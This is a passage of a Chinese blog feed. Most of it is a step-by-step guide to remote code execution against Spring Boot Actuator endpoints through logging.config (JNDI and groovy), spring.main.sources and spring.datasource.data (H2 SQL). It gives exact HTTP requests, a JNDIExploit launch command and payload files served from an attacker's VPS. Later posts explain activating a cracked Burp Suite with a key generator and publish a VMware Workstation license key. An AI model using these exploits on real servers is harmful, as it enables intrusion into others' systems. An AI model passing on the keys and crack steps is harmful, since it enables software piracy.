80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，实际内容要根据步骤二中使用的 JNDI 服务来确定：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;ldap://your-vps-ip:1389/TomcatBypass/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9y&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="步骤二：托管恶意-ldap-服务及代码"><a href="#步骤二：托管恶意-ldap-服务及代码" class="headerlink" title="步骤二：托管恶意 ldap 服务及代码"></a>步骤二：托管恶意 ldap 服务及代码</h5><p>参考<a href="https://landgrey.me/blog/21/">文章</a>，修改 <a href="https://github.com/feihong-cs/JNDIExploit">JNDIExploit</a> 并启动（也可以使用其他方法）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.0-SNAPSHOT.jar -i your-vps-ip</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤三：设置-logging-config-属性"><a href="#步骤三：设置-logging-config-属性" class="headerlink" title="步骤三：设置 logging.config 属性"></a>步骤三：设置 logging.config 属性</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">logging.config=http://your-vps-ip/example.xml</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.xml&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤四：重启应用"><a href="#步骤四：重启应用" class="headerlink" title="步骤四：重启应用"></a>步骤四：重启应用</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h4 id="漏洞原理：-7"><a href="#漏洞原理：-7" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li><li>restart 重启应用后，程序会请求 URL 地址获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="漏洞分析：-8"><a href="#漏洞分析：-8" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p> <a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p><p> <a href="https://landgrey.me/blog/21/">https://landgrey.me/blog/21/</a></p><h4 id="漏洞环境：-8"><a href="#漏洞环境：-8" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository&#x2F;springboot-restart-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9098/actuator/env</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x0A：restart-logging-config-groovy-RCE"><a href="#0x0A：restart-logging-config-groovy-RCE" class="headerlink" title="0x0A：restart logging.config groovy RCE"></a>0x0A：restart logging.config groovy RCE</h3><h4 id="利用条件：-13"><a href="#利用条件：-13" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li><li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li></ul><h4 id="利用方法：-13"><a href="#利用方法：-13" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-groovy-文件"><a href="#步骤一：托管-groovy-文件" class="headerlink" title="步骤一：托管 groovy 文件"></a>步骤一：托管 groovy 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"> </span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>groovy</code> 结尾的 <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤二：设置-logging-config-属性"><a href="#步骤二：设置-logging-config-属性" class="headerlink" title="步骤二：设置 logging.config 属性"></a>步骤二：设置 logging.config 属性</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">logging.config=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤三：重启应用"><a href="#步骤三：重启应用" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h4 id="漏洞原理：-8"><a href="#漏洞原理：-8" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>logback-classic</code> 组件的 <code>ch.qos.logback.classic.util.ContextInitializer.java</code> 代码文件逻辑中会判断 url 是否以 <code>groovy</code> 结尾</li><li>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li></ol><h4 id="漏洞环境：-9"><a href="#漏洞环境：-9" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository&#x2F;springboot-restart-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9098/actuator/env</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x0B：restart-spring-main-sources-groovy-RCE"><a href="#0x0B：restart-spring-main-sources-groovy-RCE" class="headerlink" title="0x0B：restart spring.main.sources groovy RCE"></a>0x0B：restart spring.main.sources groovy RCE</h3><h4 id="利用条件：-14"><a href="#利用条件：-14" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li><li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li></ul><h4 id="利用方法：-14"><a href="#利用方法：-14" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-groovy-文件-1"><a href="#步骤一：托管-groovy-文件-1" class="headerlink" title="步骤一：托管 groovy 文件"></a>步骤一：托管 groovy 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"> </span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>groovy</code> 结尾的 <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤二：设置-spring-main-sources-属性"><a href="#步骤二：设置-spring-main-sources-属性" class="headerlink" title="步骤二：设置 spring.main.sources 属性"></a>步骤二：设置 spring.main.sources 属性</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">spring.main.sources=http://your-vps-ip/example.groovy</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤三：重启应用-1"><a href="#步骤三：重启应用-1" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h4 id="漏洞原理：-9"><a href="#漏洞原理：-9" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>spring-boot</code> 组件中的 <code>org.springframework.boot.BeanDefinitionLoader.java</code> 文件代码逻辑中会判断 url 是否以 <code>.groovy</code> 结尾</li><li>如果 url 以 <code>.groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li></ol><h4 id="漏洞环境：-10"><a href="#漏洞环境：-10" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository&#x2F;springboot-restart-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9098/actuator/env</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="0x0C：restart-spring-datasource-data-h2-database-RCE"><a href="#0x0C：restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="0x0C：restart spring.datasource.data h2 database RCE"></a>0x0C：restart spring.datasource.data h2 database RCE</h3><h4 id="利用条件：-15"><a href="#利用条件：-15" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li><li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li><li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li></ul><h4 id="利用方法：-15"><a href="#利用方法：-15" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-sql-文件"><a href="#步骤一：托管-sql-文件" class="headerlink" title="步骤一：托管 sql 文件"></a>步骤一：托管 sql 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"> </span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p><blockquote><p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;open -a Calculator&#x27;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h5 id="步骤二：设置-spring-datasource-data-属性"><a href="#步骤二：设置-spring-datasource-data-属性" class="headerlink" title="步骤二：设置 spring.datasource.data 属性"></a>步骤二：设置 spring.datasource.data 属性</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">spring.datasource.data=http://your-vps-ip/example.sql</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"> </span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.sql&quot;&#125;</span><br></pre></td></tr></table></figure><h5 id="步骤三：重启应用-2"><a href="#步骤三：重启应用-2" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h4 id="漏洞原理：-10"><a href="#漏洞原理：-10" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol><li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li><li>restart 重启应用后，程序会请求设置的 URL 地址</li><li><code>spring-boot-autoconfigure</code> 组件中的 <code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java</code> 文件代码逻辑中会使用 <code>runScripts</code> 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li></ol><h4 id="漏洞环境：-11"><a href="#漏洞环境：-11" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository&#x2F;springboot-restart-rce</a></p><p>正常访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:9098/actuator/env</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【2024最新版】Burpsuite的安装详细教程（附带下载链接且免java环境）</title>
      <link href="/2024/12/11/%E3%80%902024%E6%9C%80%E6%96%B0%E7%89%88%E3%80%91Burpsuite%E7%9A%84%E5%AE%89%E8%A3%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E5%B8%A6%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5%E4%B8%94%E5%85%8Djava%E7%8E%AF%E5%A2%83%EF%BC%89/"/>
      <url>/2024/12/11/%E3%80%902024%E6%9C%80%E6%96%B0%E7%89%88%E3%80%91Burpsuite%E7%9A%84%E5%AE%89%E8%A3%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B%EF%BC%88%E9%99%84%E5%B8%A6%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5%E4%B8%94%E5%85%8Djava%E7%8E%AF%E5%A2%83%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong><font style="color:rgb(78, 83, 88);">Burpsuite</font></strong><font style="color:rgb(78, 83, 88);">作为一款Web渗透测试中</font><strong><font style="color:rgb(78, 83, 88);">常用的集成型工具</font></strong><font style="color:rgb(78, 83, 88);">，可以说是网安友友们</font><strong><font style="color:rgb(78, 83, 88);">不可缺少的神器</font></strong><font style="color:rgb(78, 83, 88);">！其中它对HTTP和HTTPS协议的网络流量的拦截，以及客户端的请求数据、服务端的返回信息进行处理等功能，大大方便了大家进行安全测试。</font></p><p><strong><font style="color:rgb(78, 83, 88);">Burpsuite</font></strong><font style="color:rgb(78, 83, 88);">的功能模块也十分的强大，例如：</font><strong><font style="color:rgb(78, 83, 88);">Proxy、Repeater、Intruder、Extender等</font></strong><font style="color:rgb(78, 83, 88);">，尤其是扩展（</font><strong><font style="color:rgb(78, 83, 88);">Extender</font></strong><font style="color:rgb(78, 83, 88);">）模块，搭配上各种神仙插件，更是能如虎添翼！本博主BurpSuite插件推荐：</font><a href="https://get-shell.com/2467.html"><font style="color:rgb(78, 83, 88);">BurpSuite插件推荐合集</font></a></p><h3 id="版本特色"><a href="#版本特色" class="headerlink" title="版本特色"></a>版本特色</h3><ul><li><font style="color:rgb(78, 83, 88);">内置含一键启动脚本『</font><strong><font style="color:rgb(78, 83, 88);">CNBurp无CMD窗口).VBS</font></strong><font style="color:rgb(78, 83, 88);">』，可直接启动BurpSuite！</font></li><li><font style="color:rgb(78, 83, 88);">内置JDK环境，无需安装JDK即可直接启动！</font></li><li><font style="color:rgb(78, 83, 88);">内置汉化包，更舒适的使用体验！</font></li></ul><p><font style="color:rgb(251, 33, 33);">第一次使用先按照下面的教程激活，激活后无需再次激活！！！</font></p><p><font style="color:rgb(251, 33, 33);">第一次使用先按照下面的教程激活，激活后无需再次激活！！！</font></p><p><font style="color:rgb(251, 33, 33);">第一次使用先按照下面的教程激活，激活后无需再次激活！！！</font></p><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a><strong>下载链接</strong></h2><p><a href="https://get-shell.com/1.html"><strong>极核GetShell</strong></a></p><p><strong>在下载链接下方，我们可以选择windows和Linux两个版本的安装教程。</strong><font style="color:rgb(251, 33, 33);"></font></p><h3 id="激活教程"><a href="#激活教程" class="headerlink" title="激活教程"></a><strong>激活教程</strong></h3><p><strong>视频激活教程：</strong></p><p><strong>站内跳转</strong></p><p><a href="https://live.csdn.net/v/427041?spm=1001.2014.3001.5501"><strong>burpsuit激活</strong></a></p><h4 id="以下是图文教程"><a href="#以下是图文教程" class="headerlink" title="以下是图文教程"></a><strong>以下是图文教程</strong></h4><p><strong>1、解压安装包</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163538984.png" alt="image-20241211163538655"></p><p><strong>2、打开CNBurp，和VBS</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163846007.png" alt="image-20241211163845733"><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163547999.png" alt="image-20241211163547866"><strong>3、把VBS的密钥填入到右侧的许可证密钥中，然后点击继续-手动激活</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163553149.png"></p><p><strong>4、把CNburp生成的数据填回给VBS密钥下方处，他会生成一个Activation Response值</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163557251.png" alt="image-20241211163557115"></p><p><strong>5、把浏览器的Activation Response的数据粘贴到burp处</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163601740.png" alt="image-20241211163601618"></p><p><strong>6、然后点击继续，此时我们的Burpsuit就已经安装完成了</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163606344.png"><strong>7、后续要打开burpsuite点击无cmd版本就可以直接打开</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163610959.png" alt="image-20241211163610781"></p><p><strong>8、效果图展示</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163616143.png" alt="image-20241211163615941"><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163621490.png" alt="image-20241211163621310"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VMware Workstation Pro官方版+激活秘钥</title>
      <link href="/2024/12/11/VMware_Workstation_Pro%E5%AE%98%E6%96%B9%E7%89%88+%E6%BF%80%E6%B4%BB%E7%A7%98%E9%92%A5/"/>
      <url>/2024/12/11/VMware_Workstation_Pro%E5%AE%98%E6%96%B9%E7%89%88+%E6%BF%80%E6%B4%BB%E7%A7%98%E9%92%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><font style="color:rgb(78, 83, 88);">VMware Workstation是VMware公司开发的一款功能强大的桌面虚拟化软件。它允许用户在一台物理计算机上创建和运行多个虚拟机，每个虚拟机都可以独立运行不同的操作系统和应用程序。</font></p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://get-shell.com/1013.html">极核GetsheLL</a></p><h2 id="二、安装篇"><a href="#二、安装篇" class="headerlink" title="二、安装篇"></a>二、安装篇</h2><p><font style="color:rgb(78, 83, 88);">VMware的产品任何人都可以到其官方下载并免费享受30天的软件试用，需要下载可参考官方版的VMware虚拟机如何下载，新旧版本的下载方法来了！如有条件还请支持正版软件，否则使用安装密匙也能激活使用。下面我为大家演示VMware Workstation 16 Pro虚拟机的安装过程，适合新手！</font></p><p><strong><font style="color:rgb(78, 83, 88);">注意：最新版本虚拟机的安装环境需要Win8以上系统，Win7系统不再支持</font></strong></p><p><strong><font style="color:rgb(78, 83, 88);">2、打开安装包后点击【下一步】&gt;勾选【许可协议】后再点击【下一步】</font></strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163013254.png" alt="image-20241211163013147"></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(238, 238, 238);"></font></p><p><strong><font style="color:rgb(78, 83, 88);">3、如需更改安装路径的可点击【更改】&gt;路径更改后【确定】&gt;然后将【增强型键盘驱动程序】此项勾选上，再点击【下一步】</font></strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163019815.png" alt="image-20241211163019720"></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(238, 238, 238);"></font></p><p><strong><font style="color:rgb(78, 83, 88);">04 、将【启动时检查产品更新】和【加入VMware客户体验提升计划】此两项勾选去掉&gt;然后一路点击【下一步】直到安装页面后再点击【安装】</font></strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163024891.png" alt="image-20241211163024794"></p><p><strong><font style="color:rgb(78, 83, 88);"></font></strong></p><p><strong><font style="color:rgb(78, 83, 88);">05、 点击【许可证】然后输入安装密匙：</font><strong><strong><font style="color:rgb(255, 60, 152);">MC60H-DWHD5-H80U9-6V85M-8280D</font></strong></strong><font style="color:rgb(78, 83, 88);">，待密匙验证通过后点击【完成】&gt;最后【重启电脑】即可</font></strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163030596.png"></p><p><strong><font style="color:rgb(78, 83, 88);">06、打开虚拟机，至此整个安装流程结束。</font></strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211163035472.png" alt="image-20241211163035292"></p><p><strong>教程如果有不清晰或不明白的地方，欢迎大家评论区留言讨论。</strong></p><p><strong>如果有什么不对或者需要改正的地方，请多多指教！欢迎讨论交流！</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【2025最新版】搭建个人博客教程</title>
      <link href="/2024/12/10/%E3%80%902025%E6%9C%80%E6%96%B0%E7%89%88%E3%80%91%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/"/>
      <url>/2024/12/10/%E3%80%902025%E6%9C%80%E6%96%B0%E7%89%88%E3%80%91%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
      
